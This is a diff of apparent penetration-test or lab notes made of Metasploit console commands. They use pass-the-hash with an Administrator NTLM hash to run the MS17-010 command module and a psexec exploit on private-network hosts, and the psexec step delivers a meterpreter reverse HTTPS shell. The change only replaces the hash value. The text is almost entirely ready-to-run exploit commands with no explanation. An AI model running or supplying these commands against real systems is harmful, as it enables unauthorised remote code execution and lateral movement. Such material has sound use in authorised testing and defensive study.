@@ -12,7 +12,7 @@ Use auxiliary/admin/smb/ms17_010_command
 set rhosts 10.0.10.204
 set smbdomain .
 set smbuser Administrator
-set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+set smbpass aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
 set threads 10
 set command qwinsta
 set verbose false
@@ -26,7 +26,7 @@ use exploit/windows/smb/psexec
 set rhosts 10.0.10.208
 set smbdomain .
 set smbuser Administrator
-set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+set smbpass aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
 set payload windows/x64/meterpreter/reverse_winhttps
 exploit
 ```
